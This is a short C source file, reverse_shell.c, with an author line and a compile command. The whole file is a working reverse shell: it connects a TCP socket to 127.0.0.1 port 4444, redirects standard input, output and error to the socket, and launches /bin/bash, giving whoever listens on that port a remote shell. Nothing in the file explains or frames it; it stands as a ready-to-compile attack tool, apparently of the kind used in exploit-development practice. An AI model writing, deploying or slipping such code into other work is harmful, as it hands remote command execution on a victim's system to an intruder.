/*
Filename:	reverse_shell.c
Author:		Jules Adriaens
Compile:	gcc -o reverse_shell reverse_shell.c
*/

#include <stdio.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>

int main()
{
	int s;
	struct sockaddr_in sa;

	// Create TCP socket
	s = socket(AF_INET, SOCK_STREAM, 0);

	// sockaddr structure
	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = inet_addr("127.0.0.1");
	sa.sin_port = htons(4444);

	// Initiate connection
	connect(s, (struct sockaddr *) &sa, sizeof(sa));

	// Duplicate file descriptors
	dup2(s, 0);
	dup2(s, 1);
	dup2(s, 2);

	// Spawn /bin/bash
	execve("/bin/bash", 0, 0);

	return 0;
}
